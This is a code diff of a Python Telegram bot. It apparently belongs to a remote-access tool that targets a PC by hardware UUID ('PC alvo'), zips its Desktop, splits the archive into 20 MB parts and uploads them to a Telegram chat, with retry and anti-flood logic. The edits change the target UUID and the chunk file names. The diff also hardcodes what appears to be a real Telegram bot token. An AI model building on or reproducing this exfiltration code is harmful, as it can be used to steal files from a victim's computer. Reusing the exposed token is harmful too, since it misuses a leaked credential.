@@ -68,7 +68,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 CAMINHO_ATUAL = os.path.expanduser("~/Desktop")
 
 TOKEN = "8612333444:AAFYBvyg35lTHf3R7UUHxP2rbf1r73vaVJc"
-TARGET_UUID = "7EBE554C-2C9B-11B2-A85C-EE2DB82E299A"  # PC alvo (PC 2)
+TARGET_UUID = "D585613F-811F-49C5-BB75-BBE101E08F44"  # PC alvo (PC 2)
 
 CURRENT_PATH = CAMINHO_ATUAL
 CHUNK_SIZE = 20 * 1024 * 1024  # 20 MB por parte (atualiza mais rapido)
@@ -476,7 +476,7 @@ async def getdesktop(update, context):
             def split_file():
                 with open(zip_path, "rb") as f:
                     for i in range(total_parts):
-                        chunk_path = os.path.join(temp_dir, f"{filename}.part{i+1}of{total_parts}")
+                        chunk_path = os.path.join(temp_dir, f"{filename}.part{i+1:02d}of{total_parts}")
                         chunk_paths.append(chunk_path)
                         with open(chunk_path, "wb") as chunk_file:
                             chunk_file.write(f.read(CHUNK_SIZE))
@@ -491,7 +491,7 @@ async def getdesktop(update, context):
                 tentativas = 5
                 for tentativa in range(tentativas):
                     try:
-                        await _send_with_progress(context.bot, update.effective_chat.id, chunk_path, f"{filename}.part{i+1}of{total_parts}", caption)
+                        await _send_with_progress(context.bot, update.effective_chat.id, chunk_path, f"{filename}.part{i+1:02d}of{total_parts}", caption)
                         await asyncio.sleep(3) # Pausa de 3 segundos entre partes para o Telegram não nos bloquear por flood!
                         break # Se teve sucesso, sai do ciclo de tentativas
                     except telegram.error.RetryAfter as e:
